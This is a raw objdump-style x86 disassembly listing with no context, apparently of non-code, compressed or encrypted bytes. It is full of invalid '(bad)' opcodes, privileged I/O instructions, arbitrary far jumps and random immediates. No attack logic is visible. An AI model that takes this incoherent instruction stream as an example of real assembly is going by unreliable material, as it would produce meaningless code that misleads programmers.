  420ae4:	cmp    DWORD PTR [ecx],ebp
  420ae6:	add    DWORD PTR [ecx],ebx
  420ae8:	imul   edx,DWORD PTR [edx+0x2a],0x82cabf20
  420aef:	mov    ah,0x86
  420af1:	jle    0x420af0
  420af3:	xchg   ebp,eax
  420af4:	into   
  420af5:	(bad)  
  420af6:	mov    esp,0xf897d9b8
  420afb:	adc    al,0x30
  420afd:	dec    ebx
  420afe:	adc    edx,esp
  420b00:	push   cs
  420b01:	xchg   BYTE PTR [esp+eax*2],al
  420b04:	pop    ebx
  420b05:	mov    ecx,0x9e93bc62
  420b0a:	stos   BYTE PTR es:[edi],al
  420b0b:	outs   dx,BYTE PTR ds:[esi]
  420b0c:	ret    
  420b0d:	dec    esi
  420b0e:	daa    
  420b0f:	adc    eax,DWORD PTR [eax+0x5d08da21]
  420b15:	jmp    0x6dae:0xf0af8fa7
  420b1c:	inc    eax
  420b1d:	imul   ebx,edi,0x62a5d3b2
  420b23:	leave  
  420b24:	stos   BYTE PTR es:[edi],al
  420b25:	adc    dl,0x59
  420b28:	in     al,0x37
  420b2a:	pop    edi
  420b2b:	in     eax,dx
  420b2c:	out    0x5a,eax
  420b2e:	rol    eax,0x70
  420b31:	cmp    DWORD PTR [edx+0x55c84e19],0xffffffba
  420b38:	jnp    0x420afe
  420b3a:	add    DWORD PTR [esi],eax
  420b3c:	in     eax,dx
  420b3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b3e:	iret   
  420b3f:	nop
  420b40:	sbb    esi,DWORD PTR [ebp+0x63]
  420b43:	jge    0x420ae3
  420b45:	addr16 ret 0x115e
  420b49:	aaa    
  420b4a:	stos   DWORD PTR es:[edi],eax
  420b4b:	jns    0x420b8f
  420b4d:	int    0x6e
  420b4f:	jmp    0x420b1f
  420b51:	test   eax,0x3959879a
  420b56:	mov    BYTE PTR [ebp-0x6e],cl
  420b59:	call   0xc9e71a95
  420b5e:	cmp    al,0xc3
  420b60:	push   ebx
  420b61:	retf   0xc1e4
  420b64:	xchg   esp,eax
  420b65:	std    
  420b66:	iret   
  420b67:	adc    BYTE PTR [ebp-0x56],al
  420b6a:	rcr    BYTE PTR [edx+0x62d5b6e8],1
  420b70:	(bad)  
  420b71:	cmp    BYTE PTR [ecx],ah
  420b73:	push   ss
  420b74:	das    
  420b75:	lods   al,BYTE PTR ds:[esi]
  420b76:	jmp    0x504b99cb
  420b7b:	push   esp
  420b7c:	mov    DWORD PTR [edi+0xbcb043e],esp
  420b82:	adc    al,0xaf
  420b84:	int3   
  420b85:	mov    ebx,0x1742fa8
  420b8a:	xchg   BYTE PTR [eax+0x6feafbc7],dl
  420b90:	inc    esi
  420b91:	sti    
  420b92:	push   edx
  420b93:	mov    ds:0x5b192918,eax
  420b98:	sub    ah,dh
  420b9a:	push   cs
  420b9b:	mul    esp
  420b9d:	xor    BYTE PTR [ecx-0x5751ed0f],ch
  420ba3:	or     esi,edi
  420ba5:	jecxz  0x420be0
  420ba7:	push   esp
  420ba8:	std    
  420ba9:	add    ebp,DWORD PTR ds:0xb21fce7c
  420baf:	jo     0x420b92
  420bb1:	xor    DWORD PTR [eax+edi*2+0x7c],edx
  420bb5:	jns    0x420b9e
  420bb7:	dec    esp
  420bb8:	xchg   BYTE PTR [edx+ebp*1-0x74],ch
  420bbc:	dec    ecx
  420bbd:	mov    esi,0x20fd9ca6
  420bc2:	lock dec edi
  420bc4:	test   BYTE PTR [edx+0x38053968],dl
  420bca:	fsub   QWORD PTR [ecx-0x648fda7c]
  420bd0:	push   0x5d406f71
  420bd5:	ret    0x31e
  420bd8:	cmp    BYTE PTR [esi+0xb49ad93],ah
  420bde:	sub    DWORD PTR [ebp-0x23bf9305],eax
  420be4:	ins    BYTE PTR es:[edi],dx
  420be5:	mov    ebx,0x6ed8197e
  420bea:	clc    
  420beb:	mov    esp,0xfbd088de
  420bf0:	sti    
  420bf1:	sbb    bl,BYTE PTR cs:[edi]
  420bf4:	inc    eax
  420bf5:	gs fs clc 
  420bf8:	and    al,0x44
  420bfa:	add    eax,ebx
  420bfc:	push   0x37
  420bfe:	jb     0x420c3d
  420c00:	leave  
  420c01:	test   eax,0x408e4af1
  420c06:	test   al,0x56
  420c08:	fwait
  420c09:	push   esp
  420c0a:	add    eax,0x48885a3e
  420c0f:	sub    eax,0x971fe762
  420c14:	jp     0x420b9e
  420c16:	and    cl,dl
  420c18:	jp     0x420c4a
  420c1a:	pushf  
  420c1b:	scas   al,BYTE PTR es:[edi]
  420c1c:	out    0x56,al
  420c1e:	cmp    ebx,0x289c3436
  420c24:	in     eax,0x8
  420c26:	das    
  420c27:	mov    edi,0xd915129e
  420c2c:	pop    ecx
  420c2d:	imul   edi,edi,0x67
  420c30:	dec    edi
  420c31:	and    BYTE PTR ds:0xe4d23727,0xb3
  420c38:	leave  
  420c39:	cmp    al,0x3e
  420c3b:	lea    esi,[ecx]
  420c3d:	cmp    al,0xce
  420c3f:	aaa    
  420c40:	cmp    eax,0xcc9297db
  420c45:	out    dx,eax
  420c46:	ds pop es
  420c48:	(bad)  
  420c49:	cld    
  420c4a:	lock push edi
  420c4c:	sbb    DWORD PTR [ebp+0x32],ecx
  420c4f:	xlat   BYTE PTR ds:[ebx]
  420c50:	outs   dx,BYTE PTR ds:[esi]
  420c51:	repz sub ah,0xdf
  420c55:	inc    esi
  420c56:	fild   DWORD PTR [edi]
  420c58:	dec    edi
  420c59:	inc    ecx
  420c5a:	ret    0xedc6
  420c5d:	(bad)  
  420c5e:	lea    edi,[ecx+ecx*4]
  420c61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c62:	mov    ah,0xf1
  420c64:	jmp    0x420cc4
  420c66:	into   
  420c67:	pop    esi
  420c68:	mov    cl,0x52
  420c6a:	or     al,0xb0
  420c6c:	push   0xa0841945
  420c71:	in     al,0xa2
  420c73:	xor    eax,0x6a382a7e
  420c78:	jmp    0x420c78
  420c7a:	out    dx,eax
  420c7b:	sub    eax,0x90ad14a4
  420c80:	mov    ds:0x1cec2e5d,al
  420c85:	mov    edi,0x12e37841
  420c8a:	mov    ecx,0xb82cf248
  420c8f:	pop    eax
  420c90:	jmp    0x420c8e
  420c92:	sbb    BYTE PTR [edi+edi*4-0xd],cl
  420c96:	xchg   ebp,eax
  420c97:	adc    ch,BYTE PTR [eax-0x2a]
  420c9a:	jmp    0x72e7:0x63537f89
  420ca1:	sbb    DWORD PTR [edx+ecx*4+0x35],ecx
  420ca5:	xlat   BYTE PTR ds:[ebx]
  420ca6:	test   al,0xb8
  420ca8:	push   bx
  420caa:	lods   eax,DWORD PTR ds:[esi]
  420cab:	mov    ecx,0x8222823c
  420cb0:	fiadd  WORD PTR [ebp-0x78]
  420cb3:	int3   
  420cb4:	push   0x7a3c684d
  420cb9:	sbb    DWORD PTR [edx+0x66],edi
  420cbc:	mov    cl,0xde
  420cbe:	icebp  
  420cbf:	popf   
  420cc0:	dec    esp
  420cc1:	add    edi,DWORD PTR [ecx+0x4e]
  420cc4:	jge    0x420cab
  420cc6:	adc    BYTE PTR cs:[ecx+edx*8-0x69133b95],bl
  420cce:	das    
  420ccf:	sbb    eax,0x286d0178
  420cd4:	mov    WORD PTR [esi],?
  420cd6:	sub    al,BYTE PTR [edi]
  420cd8:	fcomip st,st(0)
  420cda:	mov    eax,0x6519be1
  420cdf:	or     al,0xcd
  420ce1:	or     al,0x7c
  420ce3:	bound  esp,QWORD PTR [eax*8+0x4bb24414]
  420cea:	pop    ebp
  420ceb:	jmp    0x8178:0xde69ccb8
  420cf2:	push   ebp
  420cf3:	push   esi
  420cf4:	or     al,0x49
  420cf6:	gs ss jo 0x420d49
  420cfa:	loopne 0x420d09
  420cfc:	and    eax,0xc8b95b3b
  420d01:	inc    esp
  420d02:	xchg   ebp,eax
  420d03:	sub    al,0x11
  420d05:	sahf   
  420d06:	sbb    eax,0xa6b03f8a
  420d0b:	jno    0x420cee
  420d0d:	mov    BYTE PTR [edi],bl
  420d0f:	push   0xffffffdb
  420d11:	jp     0x420d37
  420d13:	popf   
  420d14:	mov    ds:0x556ba9e6,al
  420d19:	pop    ebp
  420d1a:	jne    0x420d20
  420d1c:	inc    BYTE PTR [ecx]
  420d1e:	in     al,dx
  420d1f:	retf   
  420d20:	test   eax,0x6c28859c
  420d25:	jns    0x420d1a
  420d27:	(bad)  
  420d28:	clc    
  420d29:	hlt    
  420d2a:	aam    0xfe
  420d2c:	cld    
  420d2d:	sbb    eax,0xe5f02456
  420d32:	test   eax,0x109c66a5
  420d37:	cmc    
  420d38:	xor    ah,BYTE PTR [edi]
  420d3a:	mov    esp,0xad63b61
  420d3f:	xor    BYTE PTR [eax+eiz*2+0x6fff8875],0xf3
  420d47:	or     BYTE PTR [edi],cl
  420d49:	dec    esp
  420d4a:	jno    0x420d58
  420d4c:	fidivr DWORD PTR [eax]
  420d4e:	inc    ecx
  420d4f:	cld    
  420d50:	cmp    al,0xa5
  420d52:	shl    DWORD PTR [esi+0xe],0x3d
  420d56:	imul   edx,DWORD PTR [esi+0x166d3838],0xc2bf4441
  420d60:	xchg   edi,eax
  420d61:	and    DWORD PTR [edi],ebx
  420d63:	sbb    DWORD PTR [edx+0x7d],esp
  420d66:	jne    0x420d78
  420d68:	cmp    eax,0x42af2034
  420d6d:	int    0x12
  420d6f:	push   0xffffffc6
  420d71:	sbb    cl,BYTE PTR [esi-0x4c]
  420d74:	cwde   
  420d75:	aad    0xbd
  420d77:	mov    esi,0x7dedd343
  420d7c:	pop    eax
  420d7d:	(bad)  
  420d7e:	inc    BYTE PTR [esi]
  420d80:	add    ecx,esi
  420d82:	xlat   BYTE PTR ds:[ebx]
  420d83:	xor    DWORD PTR [esi],esi
  420d85:	push   edx
  420d86:	and    DWORD PTR [edx-0x2aa00d62],edx
  420d8c:	fwait
  420d8d:	mov    al,ds:0x945470bf
  420d92:	rol    BYTE PTR [ebx],0xe2
  420d95:	jns    0x420dec
  420d97:	loope  0x420d6e
  420d99:	bound  esi,QWORD PTR [esp+edi*2-0x33]
  420d9d:	push   eax
  420d9e:	inc    eax
  420d9f:	xchg   DWORD PTR [edx],eax
  420da1:	iret   
  420da2:	mov    WORD PTR [ecx-0x7d],cs
  420da5:	(bad)  
  420da6:	cdq    
  420da7:	cmp    DWORD PTR [ebx],eax
  420da9:	clc    
  420daa:	push   ds
  420dab:	cmp    eax,0x93fe7125
  420db0:	push   edi
  420db1:	(bad)  
  420db2:	aam    0xb6
  420db4:	cmp    DWORD PTR [edx],eax
  420db6:	data16 xor ch,dh
  420db9:	mov    ecx,0x281c0667
  420dbe:	push   eax
  420dbf:	and    eax,0x718eb1e9
  420dc4:	js     0x420e11
  420dc6:	cld    
  420dc7:	mov    ebx,0x6da4c5f5
  420dcc:	pop    edi
  420dcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dce:	inc    edx
  420dcf:	push   edi
  420dd0:	test   al,0xfd
  420dd2:	push   ds
  420dd3:	and    BYTE PTR [ebp+0x7091f274],bl
  420dd9:	mov    ch,0x3e
  420ddb:	sahf   
  420ddc:	pop    eax
  420ddd:	out    0xca,al
  420ddf:	pop    ebx
  420de0:	pop    ebx
  420de1:	or     dl,BYTE PTR [edx]
  420de3:	and    ch,BYTE PTR ds:0x68b2ae33
  420de9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dea:	xchg   ecx,eax
  420deb:	or     BYTE PTR [eax+0x3c],dh
  420dee:	adc    edi,DWORD PTR [edx+0x115adb94]
  420df4:	adc    DWORD PTR [esi],ebx
  420df6:	adc    cl,BYTE PTR [esi*2-0x414b8414]
  420dfd:	je     0x420e4b
  420dff:	or     BYTE PTR [eax],bl
  420e01:	(bad)  
  420e02:	jnp    0x420dfa
  420e04:	sar    DWORD PTR [esi+0x13],cl
  420e07:	lock mov WORD PTR [eax+0x1c4403b8],?
  420e0e:	(bad)  
  420e0f:	mov    ebx,0x673b6e72
  420e14:	mov    ebp,0x70dfeacf
  420e19:	scas   eax,DWORD PTR es:[edi]
  420e1a:	and    BYTE PTR [edi],ah
  420e1c:	imul   edi,DWORD PTR [ebp-0x11],0xffffffdd
  420e20:	ret    0x5f35
  420e23:	ins    BYTE PTR es:[edi],dx
  420e24:	les    esp,FWORD PTR [eax+esi*4-0x3a2c838c]
  420e2b:	nop
  420e2c:	outs   dx,BYTE PTR ds:[esi]
  420e2d:	add    cl,BYTE PTR [ebp+0x3c]
  420e30:	and    DWORD PTR [ebp+0x43],0x73
  420e34:	jmp    0xdb13b2f7
  420e39:	and    DWORD PTR [edx+0x552774c0],0xffffffef
  420e40:	xchg   ecx,eax
  420e41:	jle    0x420e8b
  420e43:	rol    DWORD PTR [edx+0x4402b89b],1
  420e49:	or     edx,DWORD PTR [esi-0x5a4ef41c]
  420e4f:	or     dh,BYTE PTR [edx+0x3b]
  420e52:	and    dh,BYTE PTR [esi+0x17563d4c]
  420e58:	outs   dx,DWORD PTR ds:[esi]
  420e59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e5a:	lods   al,BYTE PTR ds:[esi]
  420e5b:	int    0x7b
  420e5d:	push   es
  420e5e:	xchg   edx,eax
  420e5f:	inc    edi
  420e60:	and    eax,0x319d13a
  420e65:	lea    ecx,[ecx-0x60]
  420e68:	xlat   BYTE PTR ds:[ebx]
  420e69:	inc    ebp
  420e6a:	xor    esi,DWORD PTR [ebx+0x48]
  420e6d:	fs aad 0x1b
  420e70:	scas   al,BYTE PTR es:[edi]
  420e71:	aas    
  420e72:	in     eax,0xa5
  420e74:	xchg   dh,cl
  420e76:	(bad)  
  420e77:	mul    DWORD PTR [esi]
  420e79:	sub    esp,DWORD PTR [esi-0x54542732]
  420e7f:	icebp  
  420e80:	(bad)  
  420e81:	mov    ebx,DWORD PTR [ecx]
  420e83:	add    ch,ah
  420e85:	fwait
  420e86:	sti    
  420e87:	jbe    0x420ecf
  420e89:	sti    
  420e8a:	aas    
  420e8b:	and    BYTE PTR [ebp+0x4f53ba58],cl
  420e91:	fs mov ch,0xbb
  420e94:	lock je 0x420e3a
  420e97:	push   0x17
  420e99:	dec    ecx
  420e9a:	mov    ch,0xb2
  420e9c:	dec    edi
  420e9d:	(bad)  
  420e9e:	push   es
  420e9f:	leave  
  420ea0:	pushf  
  420ea1:	lods   al,BYTE PTR ds:[esi]
  420ea2:	mov    WORD PTR [edx-0x75],?
  420ea5:	stos   DWORD PTR es:[edi],eax
  420ea6:	jge    0x420efa
  420ea8:	mov    al,0xf9
  420eaa:	test   al,0xfb
  420eac:	clc    
  420ead:	or     al,0x97
  420eaf:	pop    eax
  420eb0:	xchg   edi,eax
  420eb1:	pop    edx
  420eb2:	scas   al,BYTE PTR es:[edi]
  420eb3:	fwait
  420eb4:	sbb    al,0x91
  420eb6:	dec    edx
  420eb7:	addr16 xchg edi,eax
  420eb9:	lea    eax,[ebx+edx*4]
  420ebc:	out    0xaa,eax
  420ebe:	stos   BYTE PTR es:[edi],al
  420ebf:	frstor [eax]
  420ec1:	stos   DWORD PTR es:[edi],eax
  420ec2:	in     eax,0xe2
  420ec4:	ja     0x420eb4
  420ec6:	lods   al,BYTE PTR ds:[esi]
  420ec7:	jg     0x420ed1
  420ec9:	mov    cs,WORD PTR [ecx]
  420ecb:	xchg   ebx,eax
  420ecc:	ins    DWORD PTR es:[edi],dx
  420ecd:	jg     0x420e66
  420ecf:	ins    BYTE PTR es:[edi],dx
  420ed0:	mov    ch,0xff
  420ed2:	lock div DWORD PTR [esp+ecx*4+0x10f4cad]
  420eda:	retf   0x1193
  420edd:	into   
  420ede:	pop    edi
  420edf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ee0:	aam    0xef
  420ee2:	jp     0x420f3f
  420ee4:	stos   DWORD PTR es:[edi],eax
  420ee5:	jo     0x420e6f
  420ee7:	hlt    
  420ee8:	sbb    DWORD PTR [edx+0xc],0x22
  420eec:	test   DWORD PTR [edi],ebx
  420eee:	std    
  420eef:	je     0x420f0a
  420ef1:	and    al,0xd3
  420ef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ef4:	or     DWORD PTR [esi+edi*8],ebx
  420ef7:	jle    0x420f55
  420ef9:	dec    ecx
  420efa:	pushf  
  420efb:	xchg   ecx,eax
  420efc:	xor    bh,BYTE PTR [edi-0x13]
  420eff:	jo     0x420f45
  420f01:	jne    0x420e90
  420f03:	mov    cs,esp
  420f05:	xor    esi,DWORD PTR [eax]
  420f07:	rol    DWORD PTR [esi],cl
  420f09:	loope  0x420f5c
  420f0b:	ret    0xcffe
  420f0e:	out    0x1,eax
  420f10:	cld    
  420f11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f12:	adc    al,BYTE PTR [ebx]
  420f14:	dec    eax
  420f15:	mov    ebp,0x94ae6b54
  420f1a:	stc    
  420f1b:	push   ebx
  420f1c:	jno    0x420f37
  420f1e:	into   
  420f1f:	mov    DWORD PTR ds:0xac7b4161,0x7293026f
  420f29:	or     cl,BYTE PTR [ebx]
  420f2b:	pusha  
  420f2c:	or     eax,0xf3fcbe66
  420f31:	cmp    eax,0x9c41e0e8
  420f36:	fdiv   DWORD PTR [esi]
  420f38:	out    dx,eax
  420f39:	mov    ah,0xba
  420f3b:	mov    ah,0x3c
  420f3d:	adc    edi,DWORD PTR [ebp-0x7daf3ff2]
  420f43:	push   DWORD PTR [ebx+0x10]
  420f46:	aaa    
  420f47:	das    
  420f48:	dec    edx
  420f49:	lds    eax,FWORD PTR [ebp+0x588e0ab5]
  420f4f:	cs xchg edi,eax
  420f51:	clc    
  420f52:	and    ah,BYTE PTR [ebx-0x26936ca0]
  420f58:	jae    0x420f25
  420f5a:	pop    esi
  420f5b:	xchg   ecx,eax
  420f5c:	(bad)  
  420f5d:	rol    BYTE PTR [edx],cl
  420f5f:	pushf  
  420f60:	and    BYTE PTR [ebx],dh
  420f62:	cmp    dl,cl
  420f64:	add    BYTE PTR [edi],bh
  420f66:	fadd   QWORD PTR [edx-0x4b]
  420f69:	ins    DWORD PTR es:[edi],dx
  420f6a:	int3   
  420f6b:	daa    
  420f6c:	cmp    bl,dh
  420f6e:	push   ds
  420f6f:	pop    ecx
  420f70:	cdq    
  420f71:	cmp    ecx,edi
  420f73:	daa    
  420f74:	and    DWORD PTR [edx+0x16],ecx
  420f77:	into   
  420f78:	jg     0x420feb
  420f7a:	inc    ebx
  420f7b:	gs cmp al,0x79
  420f7e:	pop    ds
  420f7f:	in     al,0xdb
  420f81:	ret    
  420f82:	add    BYTE PTR [edx],0x12
  420f85:	pop    es
  420f86:	or     BYTE PTR [eax-0x38850c31],ch
  420f8c:	add    esp,DWORD PTR [ebx+0x4c0b7bc0]
  420f92:	ror    DWORD PTR [edx],1
  420f94:	xor    dh,ch
  420f96:	gs push eax
  420f98:	mov    bh,0x7d
  420f9a:	jmp    0xb2e5:0xe309a9f4
  420fa1:	les    edx,FWORD PTR [eax-0x1795ad2e]
  420fa7:	lds    ebx,FWORD PTR [ebp+edi*4-0x65799b]
  420fae:	test   al,0x7e
  420fb0:	in     al,dx
  420fb1:	repz cdq 
  420fb3:	mov    ?,WORD PTR [esi]
  420fb5:	fs ret 
  420fb7:	mov    ebx,0x8d5b0cd2
  420fbc:	jge    0x420fd5
  420fbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fbf:	pop    ebp
  420fc0:	or     ch,BYTE PTR ds:0x69013f13
  420fc6:	mov    ds:0xaf25843c,al
  420fcb:	loop   0x420f6b
  420fcd:	(bad)  
  420fce:	mov    edi,0x48605954
  420fd3:	aam    0x32
  420fd5:	test   BYTE PTR [esi-0x8],bl
  420fd8:	or     dl,BYTE PTR [ebx-0x5f9d4992]
  420fde:	sbb    al,0x52
  420fe0:	xor    ebx,DWORD PTR [ecx-0x29]
  420fe3:	jmp    0xab5d:0x606eedfa
  420fea:	test   BYTE PTR [ecx+0x3f],ah
  420fed:	push   ebx
  420fee:	or     ah,dh
  420ff0:	adc    DWORD PTR [eax+0x1f],ebp
  420ff3:	cli    
  420ff4:	ss pushw cs
  420ff7:	cmp    ah,0xcf
  420ffa:	shr    DWORD PTR [eax+0x195eb5c2],0xb2
  421001:	mov    esi,0x39365257
  421006:	iret   
  421007:	fxtract 
  421009:	hlt    
  42100a:	pop    ss
  42100b:	and    al,0xb6
  42100d:	ret    
  42100e:	test   BYTE PTR [edx],dl
  421010:	jno    0x420fa7
  421012:	mov    ebx,0x2a4b4903
  421017:	pop    edx
  421018:	push   ds
  421019:	repz xor al,0xa1
  42101c:	xor    eax,DWORD PTR [edi]
  42101e:	inc    esp
  42101f:	inc    ebx
  421020:	mov    WORD PTR [ecx-0x158b68bc],fs
  421026:	psubusw mm4,QWORD PTR [eax+edx*2-0x6f542c39]
  42102e:	ss mov ch,0x22
  421031:	adc    DWORD PTR [ecx+0x44070b38],ecx
  421037:	mov    ebx,0x9fc4901c
  42103c:	cmp    BYTE PTR [edx+edi*4],bh
  42103f:	ja     0x420fc8
  421041:	or     al,0x59
  421043:	push   eax
  421044:	pop    esi
  421045:	outs   dx,DWORD PTR ds:[esi]
  421046:	rol    BYTE PTR [edi+0x2a5d292a],cl
  42104c:	mov    bl,al
  42104e:	jb     0x421078
  421050:	mov    ds:0xd3cb4891,al
  421055:	push   esp
  421056:	inc    edi
  421057:	cmp    esp,ecx
  421059:	mov    DWORD PTR [esi],esp
  42105b:	test   eax,0x59b64111
  421060:	jbe    0x421012
  421062:	and    edi,DWORD PTR [ecx+0x60b743b3]
  421068:	shr    BYTE PTR [edx+0x669a90c1],cl
  42106e:	lds    ebp,FWORD PTR [ecx+0x13]
  421071:	iret   
  421072:	mov    esi,0x3ded5e58
  421077:	in     al,dx
  421078:	inc    esp
  421079:	jnp    0x4210c5
  42107b:	jmp    0xde28879
  421080:	outs   dx,DWORD PTR ds:[esi]
  421081:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421082:	std    
  421083:	bound  esp,QWORD PTR [esi-0x4a9454a]
  421089:	mov    ds:0x38919c0a,al
  42108e:	pop    eax
  42108f:	pop    esi
  421090:	fwait
  421091:	xor    al,0xb3
  421093:	jecxz  0x4210ba
  421095:	dec    edx
  421096:	adc    DWORD PTR ds:0x4e5137a1,esi
  42109c:	pushf  
  42109d:	or     dh,BYTE PTR [edx+0x35]
  4210a0:	sbb    DWORD PTR [esi-0x79],0x2d7e11ab
  4210a7:	adc    eax,0xb43ea778
  4210ac:	push   eax
  4210ad:	mov    ebp,0x3ecbb67a
  4210b2:	or     ebp,DWORD PTR [eax+0x929663a]
  4210b8:	add    BYTE PTR [eax],cl
  4210ba:	cmp    DWORD PTR [eax+0x7c4e6e1b],ebp
  4210c0:	add    DWORD PTR [ecx],ecx
  4210c2:	sub    eax,DWORD PTR [ecx+0x38]
  4210c5:	loopne 0x42111d
  4210c7:	and    DWORD PTR [eax],esi
  4210c9:	pop    esp
  4210ca:	jecxz  0x4210af
  4210cc:	sbb    eax,0x29c4cdd7
  4210d1:	fiadd  DWORD PTR [eax]
  4210d3:	inc    BYTE PTR [eax]
  4210d5:	pop    ebp
  4210d6:	call   0x5678:0x384905
  4210dd:	add    eax,DWORD PTR [ecx-0xe]
  4210e0:	fwait
  4210e1:	cli    
  4210e2:	mov    ebp,0x10096034
  4210e7:	push   ecx
  4210e8:	test   DWORD PTR [ebp-0x68a4fab0],esi
  4210ee:	call   0x821e:0x31a008c2
  4210f5:	(bad)  
  4210f6:	pop    ebx
  4210f7:	inc    ebp
  4210f8:	adc    eax,0xdcaf20fc
  4210fd:	mov    eax,ds:0x590dbcbe
  421102:	and    al,0x19
  421104:	inc    edi
  421105:	jb     0x4210af
  421107:	dec    ecx
  421108:	retf   
  421109:	(bad)  
  42110a:	ins    BYTE PTR es:[edi],dx
  42110b:	dec    edi
  42110c:	clc    
  42110d:	pop    eax
  42110e:	mov    ebp,0x3c9f8128
  421113:	xchg   ecx,eax
  421114:	test   esi,esi
  421116:	pop    ebx
  421117:	sub    BYTE PTR [eax-0x5a],bl
  42111a:	out    0x73,al
  42111c:	aaa    
  42111d:	push   esp
  42111e:	and    ebx,esp
  421120:	mov    ds:0xde37f28d,al
  421125:	jb     0x4210b8
  421127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421128:	dec    ebp
  421129:	adc    DWORD PTR [edi],esp
  42112b:	test   eax,0xb0157ff6
  421130:	push   cs
  421131:	mov    ecx,0xbbf89c89
  421136:	(bad)  
  421137:	xchg   ebx,eax
  421138:	xor    dh,BYTE PTR [eax]
  42113a:	cmp    edx,ecx
  42113c:	push   ds
  42113d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42113e:	mov    esp,ebx
  421140:	popf   
  421141:	sub    bh,cl
  421143:	mov    cs,WORD PTR [ebx]
  421145:	retf   0xc6bb
  421148:	lock jmp 0xe62d:0x16dee8ca
  421150:	(bad)  
  421151:	icebp  
  421152:	daa    
  421153:	sub    edi,DWORD PTR [edx+edi*8-0x1eb1dff1]
  42115a:	mov    eax,0x1793977c
  42115f:	mov    cl,0x8d
  421161:	fsub   QWORD PTR [esi]
  421163:	retf   0xcb62
  421166:	pop    es
  421167:	add    ecx,DWORD PTR [ecx-0x70]
  42116a:	in     al,dx
  42116b:	add    edi,DWORD PTR [edi-0xb01ec35]
  421171:	pop    ebp
  421172:	jp     0x4211c2
  421174:	cli    
  421175:	xchg   ebx,eax
  421176:	ffreep st(1)
  421178:	arpl   dx,si
  42117a:	das    
  42117b:	mov    edx,0x65bef62a
  421180:	pop    ds
  421181:	lods   al,BYTE PTR ds:[esi]
  421182:	xor    al,0x51
  421184:	dec    edx
  421185:	ror    bl,1
  421187:	and    BYTE PTR [ebp+0x2c76d225],dl
  42118d:	nop
  42118e:	mov    ds:0x692f9747,al
  421193:	sbb    ch,BYTE PTR [edi-0x79e36078]
  421199:	sbb    eax,0xdb65f327
  42119e:	iret   
  42119f:	inc    edi
  4211a0:	mov    bh,0xaf
  4211a2:	pushf  
  4211a3:	sub    DWORD PTR [esi-0x4f],ecx
  4211a6:	in     al,dx
  4211a7:	inc    esp
  4211a8:	gs test eax,ecx
  4211ab:	push   ss
  4211ac:	mov    al,ds:0x34fdd270
  4211b1:	ja     0x4211dd
  4211b3:	pusha  
  4211b4:	xchg   DWORD PTR [ebp+0x11],edx
  4211b7:	loop   0x4211b6
  4211b9:	and    BYTE PTR [ecx+0x42],dl
  4211bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211bd:	mov    eax,0x43e772d8
  4211c2:	dec    edi
  4211c3:	xor    ecx,DWORD PTR [esp+ebp*8+0x33]
  4211c7:	xor    DWORD PTR [edi+0x6e],edi
  4211ca:	adc    ecx,DWORD PTR [edi-0x3e]
  4211cd:	mov    ch,0x64
  4211cf:	inc    ebp
  4211d0:	icebp  
  4211d1:	das    
  4211d2:	mov    edx,0xbcc0a8c6
  4211d7:	out    0x8b,eax
  4211d9:	and    edx,DWORD PTR [ecx-0x7]
  4211dc:	cld    
  4211dd:	inc    ebp
  4211de:	push   0xde8ed92b
  4211e3:	dec    ebp
  4211e4:	push   edx
  4211e5:	jmp    0x1cfd:0xfc6352d8
  4211ec:	(bad)  
  4211ed:	xchg   edx,eax
  4211ee:	shr    BYTE PTR [edi+0x5a7f91ba],0x1f
  4211f5:	daa    
  4211f6:	xchg   edi,eax
  4211f7:	sar    DWORD PTR [eax-0x17],1
  4211fa:	retf   
  4211fb:	test   eax,0xfadfa4aa
  421200:	xor    dl,BYTE PTR [ecx]
  421202:	mov    esp,0x70784d56
  421207:	pop    eax
  421208:	jno    0x4211aa
  42120a:	bound  esi,QWORD PTR [eax+0x7eed7d19]
  421210:	lods   eax,DWORD PTR ds:[esi]
  421211:	sbb    BYTE PTR [bp+di+0x4184],bh
  421216:	jle    0x42125b
  421218:	ins    DWORD PTR es:[edi],dx
  421219:	mov    al,ds:0xc84df578
  42121e:	imul   esi,DWORD PTR [esi-0x48],0xffffffe1
  421222:	mov    edi,0x584eec7f
  421227:	xor    ecx,eax
  421229:	out    0xb5,al
  42122b:	call   0xbdd86fa1
  421230:	popa   
  421231:	xchg   edi,eax
  421232:	jg     0x42124f
  421234:	dec    esp
  421235:	call   0x17c:0x93c88b12
  42123c:	ins    BYTE PTR es:[edi],dx
  42123d:	push   ebx
  42123e:	cmp    al,BYTE PTR [edi-0x5bbdaf00]
  421244:	inc    eax
  421245:	and    ecx,eax
  421247:	adc    cl,dh
  421249:	and    WORD PTR ds:0xc8c8a82,0x6627
  421252:	mov    ebx,0x49f717b5
  421257:	out    dx,eax
  421258:	out    0x24,al
  42125a:	xor    eax,0x1e1605e7
  42125f:	sbb    al,0x88
  421261:	ins    DWORD PTR es:[edi],dx
  421262:	inc    ebx
  421263:	loope  0x42129c
  421265:	pop    ss
  421266:	pop    ss
  421267:	inc    ebx
  421268:	push   esi
  421269:	sub    bl,0x53
  42126c:	cmp    eax,0x88f22cc6
  421271:	popa   
  421272:	mov    ebp,0x975edae5
  421277:	push   ecx
  421278:	sbb    DWORD PTR [edx],ecx
  42127a:	push   edx
  42127b:	inc    edx
  42127c:	mov    al,ds:0xb21ce530
  421281:	ins    BYTE PTR es:[edi],dx
  421282:	test   DWORD PTR [esi-0x6739a888],edx
  421288:	test   BYTE PTR [esi-0x75eefd4f],0xbb
  42128f:	xchg   ebx,eax
  421290:	cmp    al,0x8e
  421292:	mov    esi,0x4bfaa7bf
  421297:	into   
  421298:	jle    0x42128d
  42129a:	cdq    
  42129b:	xchg   esp,eax
  42129c:	xchg   ebp,eax
  42129d:	cmp    ch,BYTE PTR [edx+0x23]
  4212a0:	mov    edx,0x2f14dc23
